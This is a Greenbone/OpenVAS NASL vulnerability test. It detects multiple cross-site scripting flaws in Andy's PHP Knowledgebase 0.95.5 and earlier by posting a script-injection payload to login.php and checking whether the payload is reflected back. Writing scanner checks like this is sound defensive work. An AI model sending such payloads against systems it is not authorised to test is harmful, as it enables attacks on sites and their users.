# SPDX-FileCopyrightText: 2011 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:aphpkb:aphpkb";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802225");
  script_version("2023-10-27T05:05:28+0000");
  script_tag(name:"last_modification", value:"2023-10-27 05:05:28 +0000 (Fri, 27 Oct 2023)");
  script_tag(name:"creation_date", value:"2011-08-02 09:08:31 +0200 (Tue, 02 Aug 2011)");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_name("Andy's PHP Knowledgebase Multiple Cross-Site Scripting Vulnerabilities");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("secpod_aphpkb_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("aphpkb/installed");

  script_xref(name:"URL", value:"http://secpod.org/blog/?p=220");
  script_xref(name:"URL", value:"http://secpod.org/advisories/SECPOD_APHPKB_XSS.txt");

  script_tag(name:"impact", value:"Successful exploitation will allow attacker to insert arbitrary
  HTML and script code, which will be executed in a user's browser session in the
  context of an affected site.");

  script_tag(name:"affected", value:"Andy's PHP Knowledgebase version 0.95.5 and prior.");

  script_tag(name:"insight", value:"The flaws are caused by improper validation of user-supplied
  input passed via the 'username' parameter in login.php and forgot_password.php,
  'first_name', 'last_name', 'email', 'username' parameters in register.php,
  and 'keyword_list' parameter in keysearch.php, that allows attackers to execute
  arbitrary HTML and script code on the web server.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"summary", value:"Andy's PHP Knowledgebase is prone to multiple cross site scripting vulnerabilities.");

  script_tag(name:"qod_type", value:"remote_analysis");
  script_tag(name:"solution_type", value:"WillNotFix");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");
include("misc_func.inc");

if(!port = get_app_port(cpe:CPE))
  exit(0);

if(!dir = get_app_location(cpe:CPE, port:port))
  exit(0);

if(dir == "/")
  dir = "";

data = string('username="><script>alert("VT-XSS-Test")</script>', '&password=&submit=Login');
url = dir + "/login.php";

req = http_post_put_req(port:port, url:url, data:data, add_headers:make_array("Content-Type", "application/x-www-form-urlencoded"));
res = http_keepalive_send_recv(port:port, data:req);

if(ereg(pattern:"^HTTP/[0-9]\.[0-9] 200 .*", string:res) && '><script>alert("VT-XSS-Test")</script>' >< res){
  report = http_report_vuln_url(port:port, url:url);
  security_message(port:port, data:report);
  exit(0);
}

exit(99);
